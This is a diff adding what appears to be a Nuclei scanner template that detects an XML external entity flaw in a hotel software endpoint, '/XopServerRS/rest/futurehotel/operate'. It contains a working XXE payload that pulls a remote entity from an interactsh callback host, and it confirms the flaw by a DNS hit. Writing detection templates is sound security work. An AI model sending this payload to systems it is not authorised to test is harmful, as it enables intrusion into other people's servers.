@@ -1,0 +1,26 @@
+id: xiruanyun-operate-xxe
+
+info:
+  name: xiruanyun-operate-xxe
+  author: msk
+  severity: high
+
+
+http:
+  - raw:
+      - |
+        POST /XopServerRS/rest/futurehotel/operate HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.3157.54 Safari/537.36
+        Connection: close
+        Content-Type: text/xml
+        Accept-Encoding: gzip
+
+        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{interactsh-url}}"> %remote;]>
+
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
